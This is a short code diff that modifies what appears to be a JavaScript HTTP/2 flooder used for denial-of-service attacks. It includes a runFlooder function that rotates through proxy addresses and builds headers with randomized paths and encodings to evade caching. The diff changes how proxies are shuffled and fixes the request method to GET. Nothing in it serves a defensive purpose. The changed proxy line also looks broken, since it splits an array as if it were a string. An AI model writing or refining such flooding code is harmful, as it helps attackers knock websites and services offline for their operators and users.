@@ -340,7 +340,7 @@ return result;
 }
 const randstrsValue = randstrs(10);
   function runFlooder() {
-    const proxyAddr = [...new Set(Array.from({ length: 100 }, () => randomElement(proxies)))].slice(0, 1000);
+    const proxyAddr = proxies.sort(() => Math.random() - 0.5).slice(0, 100);
     const parsedProxy = proxyAddr.split(":");
     const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
     const nm = [
@@ -513,7 +513,7 @@ let headers = {
   ":authority": parsedTarget.host,
   ":scheme": "https",
   ":path": parsedTarget.path + "?" + randstr(3) + "=" +generateRandomString(10,25),
-  ":method": Math.random() < 0.5 ? "GET" : "POST",
+  ":method": "GET",
   "pragma" : "no-cache",
   "upgrade-insecure-requests" : "1",
   "accept-encoding" : encoding_header[Math.floor(Math.random() * encoding_header.length)],
